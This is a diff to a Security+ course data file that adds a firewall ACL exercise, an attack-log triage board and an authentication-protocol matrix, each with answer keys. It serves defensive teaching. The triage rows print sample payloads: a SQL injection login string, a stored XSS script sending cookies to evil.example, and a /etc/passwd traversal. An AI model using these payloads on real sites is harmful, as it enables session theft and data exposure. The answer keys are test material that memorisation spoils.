@@ -1712,98 +1712,369 @@ var COURSE_COMPTIA_SECURITYPLUS = {
   ],
   "arch": [
     {
-      "title": "Level 5: Zero Trust Perimeter (pfSense & Proxmox)",
+      "title": "Security+ Lab: Zero Trust Perimeter (pfSense & Proxmox)",
       "desc": "A junior engineer dumped all your Proxmox containers on a flat /24 subnet and port-forwarded 80/443 directly to the NGINX box. You need to implement a Zero Trust perimeter. Place the services in the correct VLANs and configure the pfSense rules.",
       "zones": [
         {
           "id": "wan",
-          "name": "WAN (Internet)",
-          "accepts": [
-            "user",
-            "attacker"
-          ]
+          "label": "WAN (Internet)",
+          "needed": []
         },
         {
           "id": "dmz",
-          "name": "VLAN 10: DMZ",
-          "accepts": [
-            "nginx",
-            "waf"
+          "label": "VLAN 10: DMZ",
+          "needed": [
+            "NGINX Reverse Proxy",
+            "Web App Firewall"
           ]
         },
         {
           "id": "lan",
-          "name": "VLAN 20: Secure LAN",
-          "accepts": [
-            "db",
-            "backend"
+          "label": "VLAN 20: Secure LAN",
+          "needed": [
+            "PostgreSQL Cluster",
+            "Node.js API"
           ]
         },
         {
           "id": "pfsense",
-          "name": "pfSense Firewall",
-          "accepts": [
-            "rule_allow_443",
-            "rule_deny_all",
-            "rule_allow_db"
+          "label": "pfSense Firewall",
+          "needed": [
+            "Allow Inbound 443 -> DMZ",
+            "Implicit Deny All",
+            "Allow DMZ -> LAN 5432"
           ]
         }
       ],
       "palette": [
-        {
-          "id": "nginx",
-          "label": "NGINX Reverse Proxy",
-          "type": "resource"
-        },
-        {
-          "id": "db",
-          "label": "PostgreSQL Cluster",
-          "type": "resource"
-        },
-        {
-          "id": "backend",
-          "label": "Node.js API",
-          "type": "resource"
-        },
-        {
-          "id": "waf",
-          "label": "Web App Firewall",
-          "type": "resource"
-        },
-        {
-          "id": "rule_allow_443",
-          "label": "Allow Inbound 443 -> DMZ",
-          "type": "policy"
-        },
-        {
-          "id": "rule_allow_db",
-          "label": "Allow DMZ -> LAN 5432",
-          "type": "policy"
-        },
-        {
-          "id": "rule_deny_all",
-          "label": "Implicit Deny All",
-          "type": "policy"
-        }
+        "NGINX Reverse Proxy",
+        "PostgreSQL Cluster",
+        "Node.js API",
+        "Web App Firewall",
+        "Allow Inbound 443 -> DMZ",
+        "Allow DMZ -> LAN 5432",
+        "Implicit Deny All"
       ],
-      "dm": {
-        "wan": [],
-        "dmz": [
-          "nginx",
-          "waf"
-        ],
-        "lan": [
-          "db",
-          "backend"
-        ],
-        "pfsense": [
-          "rule_allow_443",
-          "rule_allow_db",
-          "rule_deny_all"
-        ]
-      },
+      "dm": {},
       "wm": "Perfect. The WAF and NGINX proxy absorb public traffic in the DMZ. The pfSense firewall explicitly permits only port 443 into the DMZ, and only port 5432 from the DMZ to the Secure LAN. Everything else drops via Implicit Deny. This is how you prevent a compromised web server from pivoting to the database."
     }
   ],
-  "sales": []
+  "sales": [],
+  "pbq": [
+    {
+      "id": "secplus-acl",
+      "title": "Firewall ACL Ordering",
+      "brief": "Mammoth Capital's internal firewall sits between the <strong>workstations</strong>, the <strong>server VLAN</strong>, the <strong>management jumpbox</strong> and the <strong>DMZ web server</strong>. The rule set below was edited in a hurry and is wrong. Fix it so that:<ul><li>anyone (including the internet) can reach the DMZ web server over <strong>HTTPS</strong>;</li><li><strong>SSH</strong> is allowed <strong>only from the admin jumpbox</strong> (to the DMZ web server and the servers);</li><li>workstations can browse the web over HTTPS;</li><li>workstations can <strong>never</strong> reach the servers over <strong>SMB (445)</strong> or <strong>RDP (3389)</strong> (no lateral movement).</li></ul>Rules are evaluated top to bottom; the <strong>first match wins</strong> and anything unmatched hits the <strong>implicit deny</strong>. Edit fields, reorder with the arrows, and set unused rows to <em>Disabled</em>.",
+      "context": {
+        "type": "pre",
+        "title": "Address objects",
+        "body": "Any            0.0.0.0/0      (includes the internet)\nWorkstations   10.0.10.0/24\nServers        10.0.20.0/24\nJumpbox        10.0.99.10/32  (admin jumpbox, management VLAN)\nDMZ-Web        172.16.1.10/32"
+      },
+      "parts": [
+        {
+          "kind": "acl",
+          "title": "Rule table",
+          "objects": {
+            "Any": "0.0.0.0/0",
+            "Workstations": "10.0.10.0/24",
+            "Servers": "10.0.20.0/24",
+            "Jumpbox": "10.0.99.10/32",
+            "DMZ-Web": "172.16.1.10/32"
+          },
+          "ports": [
+            "Any",
+            "22",
+            "80",
+            "443",
+            "445",
+            "3389"
+          ],
+          "protocols": [
+            "TCP",
+            "UDP",
+            "Any"
+          ],
+          "rules": [
+            {
+              "action": "Permit",
+              "proto": "TCP",
+              "src": "Any",
+              "dst": "Any",
+              "port": "22"
+            },
+            {
+              "action": "Permit",
+              "proto": "TCP",
+              "src": "Workstations",
+              "dst": "Any",
+              "port": "Any"
+            },
+            {
+              "action": "Deny",
+              "proto": "TCP",
+              "src": "Workstations",
+              "dst": "Servers",
+              "port": "445"
+            },
+            {
+              "action": "Deny",
+              "proto": "TCP",
+              "src": "Workstations",
+              "dst": "Servers",
+              "port": "3389"
+            },
+            {
+              "action": "Permit",
+              "proto": "TCP",
+              "src": "Any",
+              "dst": "DMZ-Web",
+              "port": "80"
+            },
+            {
+              "action": "Disabled",
+              "proto": "TCP",
+              "src": "Any",
+              "dst": "Any",
+              "port": "Any"
+            }
+          ],
+          "flows": [
+            {
+              "label": "Internet client → DMZ-Web HTTPS",
+              "proto": "TCP",
+              "src": "203.0.113.50",
+              "dst": "172.16.1.10",
+              "port": "443",
+              "expect": "Permit"
+            },
+            {
+              "label": "Jumpbox → DMZ-Web SSH",
+              "proto": "TCP",
+              "src": "10.0.99.10",
+              "dst": "172.16.1.10",
+              "port": "22",
+              "expect": "Permit"
+            },
+            {
+              "label": "Jumpbox → server SSH",
+              "proto": "TCP",
+              "src": "10.0.99.10",
+              "dst": "10.0.20.15",
+              "port": "22",
+              "expect": "Permit"
+            },
+            {
+              "label": "Workstation → internet HTTPS",
+              "proto": "TCP",
+              "src": "10.0.10.25",
+              "dst": "198.51.100.20",
+              "port": "443",
+              "expect": "Permit"
+            },
+            {
+              "label": "Internet → DMZ-Web SSH",
+              "proto": "TCP",
+              "src": "203.0.113.50",
+              "dst": "172.16.1.10",
+              "port": "22",
+              "expect": "Deny"
+            },
+            {
+              "label": "Workstation → DMZ-Web SSH",
+              "proto": "TCP",
+              "src": "10.0.10.25",
+              "dst": "172.16.1.10",
+              "port": "22",
+              "expect": "Deny"
+            },
+            {
+              "label": "Workstation → server SMB (lateral)",
+              "proto": "TCP",
+              "src": "10.0.10.25",
+              "dst": "10.0.20.15",
+              "port": "445",
+              "expect": "Deny"
+            },
+            {
+              "label": "Workstation → server RDP (lateral)",
+              "proto": "TCP",
+              "src": "10.0.10.25",
+              "dst": "10.0.20.15",
+              "port": "3389",
+              "expect": "Deny"
+            },
+            {
+              "label": "Internet → server RDP",
+              "proto": "TCP",
+              "src": "203.0.113.50",
+              "dst": "10.0.20.15",
+              "port": "3389",
+              "expect": "Deny"
+            }
+          ]
+        }
+      ],
+      "solution": "One correct set: <code>Permit TCP Any → DMZ-Web 443</code>, <code>Permit TCP Jumpbox → Any 22</code>, <code>Deny TCP Workstations → Servers 445</code>, <code>Deny TCP Workstations → Servers 3389</code>, <code>Permit TCP Workstations → Any 443</code>, then let the <strong>implicit deny</strong> drop everything else. The original table failed in three ways: rule 1 allowed SSH from <em>anyone</em>, the DMZ rule opened HTTP (80) instead of HTTPS (443), and the broad <code>Permit Workstations → Any Any</code> sat <em>above</em> the SMB/RDP denies, so it matched first and the denies never fired. Put specific denies above broader permits, and never permit \"Any port\" when the requirement names one."
+    },
+    {
+      "id": "secplus-triage",
+      "title": "Attack Log & Payload Triage",
+      "brief": "Five snippets landed in the SOC queue overnight. For each one, identify the <strong>attack</strong> and the <strong>control that fixes the root cause</strong>. Each attack and each control is used once.",
+      "parts": [
+        {
+          "kind": "grid",
+          "title": "Triage board",
+          "columns": [
+            {
+              "key": "attack",
+              "label": "Attack",
+              "type": "select",
+              "options": [
+                "SQL injection",
+                "Stored XSS",
+                "Reflected XSS",
+                "Directory traversal",
+                "Pass-the-hash",
+                "ARP poisoning",
+                "CSRF"
+              ]
+            },
+            {
+              "key": "fix",
+              "label": "Root-cause control",
+              "type": "select",
+              "options": [
+                "Parameterized queries",
+                "Context-aware output encoding",
+                "WAF + input validation (canonicalize paths)",
+                "Credential Guard / disable NTLM",
+                "Dynamic ARP Inspection",
+                "Multifactor authentication",
+                "Account lockout policy"
+              ]
+            }
+          ],
+          "rows": [
+            {
+              "label": "Web access log",
+              "detail": "10.0.10.77 - - [18/Oct/2026:02:14:09] \"GET /portal/login.php?user=admin%27%20OR%20%271%27%3D%271%27--&pass=x HTTP/1.1\" 200 5120",
+              "answer": {
+                "attack": "SQL injection",
+                "fix": "Parameterized queries"
+              },
+              "explain": "<code>admin' OR '1'='1'--</code> closes the string and comments out the password check. Prepared statements keep input as data, never SQL."
+            },
+            {
+              "label": "Comment saved, then served to every visitor",
+              "detail": "POST /research/comments HTTP/1.1\nbody=Great analysis!<script>fetch('https://evil.example/c?'+document.cookie)</script>\n\n-- later, every page view of /research/q3-outlook returns the comment unescaped --",
+              "answer": {
+                "attack": "Stored XSS",
+                "fix": "Context-aware output encoding"
+              },
+              "explain": "The script is <em>stored</em> and runs in other users' browsers (reflected XSS only bounces off one crafted link). Encode output for its HTML context so the payload renders as text."
+            },
+            {
+              "label": "File download endpoint",
+              "detail": "GET /reports/download?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1  200  1874 bytes",
+              "answer": {
+                "attack": "Directory traversal",
+                "fix": "WAF + input validation (canonicalize paths)"
+              },
+              "explain": "<code>../</code> sequences (URL-encoded as <code>%2F</code>) walk out of the reports folder. Canonicalize the path, allow-list file names, and let a WAF block traversal patterns."
+            },
+            {
+              "label": "Domain controller security log",
+              "detail": "EventID 4624  Logon Type 3  Authentication Package: NTLM\n  Account: svc-backup   Source: WS-0412 (10.0.10.41)  → FS-01, FS-02, SQL-01, DC-02 within 90 seconds\n  No matching 4768 (Kerberos TGT request) for svc-backup from WS-0412",
+              "answer": {
+                "attack": "Pass-the-hash",
+                "fix": "Credential Guard / disable NTLM"
+              },
+              "explain": "Network logons over NTLM to many servers in seconds with no Kerberos ticket request: a stolen hash is being replayed. Credential Guard protects hashes in memory; restricting NTLM removes the protocol being abused."
+            },
+            {
+              "label": "Workstation ARP table + switch log",
+              "detail": "C:\\> arp -a\n  10.0.10.1     00-0c-29-5e-91-2a   dynamic   <- default gateway\n  10.0.10.57    00-0c-29-5e-91-2a   dynamic\nSW-ACC-03: 4,200 gratuitous ARP replies from Gi1/0/17 in 60 s (DAI not enabled)",
+              "answer": {
+                "attack": "ARP poisoning",
+                "fix": "Dynamic ARP Inspection"
+              },
+              "explain": "The gateway and host .57 share one MAC and a port is flooding gratuitous ARPs: someone is claiming to be the gateway (on-path). DAI checks ARP against the DHCP snooping bindings and drops forged replies."
+            }
+          ]
+        }
+      ],
+      "solution": "Match the evidence to the mechanism: quote-and-comment in a query string (SQLi), script stored and replayed to others (stored XSS), <code>../</code> in a file parameter (traversal), NTLM type-3 logons fanning out with no Kerberos (pass-the-hash), one MAC answering for the gateway (ARP poisoning). MFA and lockout are good controls, but neither fixes any of these root causes."
+    },
+    {
+      "id": "secplus-auth",
+      "title": "Zero Trust & Auth Protocol Matrix",
+      "brief": "Mammoth Capital is rolling out Zero Trust. Pick the protocol each scenario needs. Each protocol is used once.",
+      "parts": [
+        {
+          "kind": "grid",
+          "title": "Scenario → protocol",
+          "columns": [
+            {
+              "key": "proto",
+              "label": "Protocol",
+              "type": "select",
+              "options": [
+                "SAML 2.0",
+                "OIDC / OAuth 2.0",
+                "Kerberos",
+                "RADIUS",
+                "TACACS+",
+                "802.1X with EAP-TLS"
+              ]
+            }
+          ],
+          "rows": [
+            {
+              "label": "Employees sign in once to a third-party SaaS HR portal in the browser; the corporate IdP sends a signed XML assertion.",
+              "answer": {
+                "proto": "SAML 2.0"
+              },
+              "explain": "Browser SSO to a SaaS app using signed XML assertions from the IdP is SAML 2.0."
+            },
+            {
+              "label": "The new mobile trading app offers \"Sign in with Google\" and then calls the firm's API with a token scoped to read-only quotes.",
+              "answer": {
+                "proto": "OIDC / OAuth 2.0"
+              },
+              "explain": "OpenID Connect handles the sign-in (ID token); OAuth 2.0 issues the scoped access token for the API."
+            },
+            {
+              "label": "Domain-joined Windows PCs access on-prem file shares using tickets issued by Active Directory.",
+              "answer": {
+                "proto": "Kerberos"
+              },
+              "explain": "AD domain authentication with TGTs and service tickets is Kerberos."
+            },
+            {
+              "label": "The VPN concentrator and Wi-Fi controllers forward user logins to one AAA server and send it session accounting.",
+              "answer": {
+                "proto": "RADIUS"
+              },
+              "explain": "Network-access AAA from NAS devices (VPN, Wi-Fi) is RADIUS (UDP 1812/1813)."
+            },
+            {
+              "label": "Network engineers log into switches; every command must be authorized individually and the whole session encrypted (TCP 49).",
+              "answer": {
+                "proto": "TACACS+"
+              },
+              "explain": "Per-command authorization for device administration, full-payload encryption over TCP 49: TACACS+."
+            },
+            {
+              "label": "A laptop must present its device certificate before the switch port gives it any network access.",
+              "answer": {
+                "proto": "802.1X with EAP-TLS"
+              },
+              "explain": "Port-based NAC (802.1X) with mutual certificate authentication (EAP-TLS) before the port opens."
+            }
+          ]
+        }
+      ],
+      "solution": "Web SSO with XML assertions = SAML; modern app sign-in plus scoped API tokens = OIDC/OAuth 2.0; AD tickets = Kerberos; network access AAA = RADIUS; device administration with per-command authorization = TACACS+; certificate-gated switch ports = 802.1X EAP-TLS."
+    }
+  ]
 };
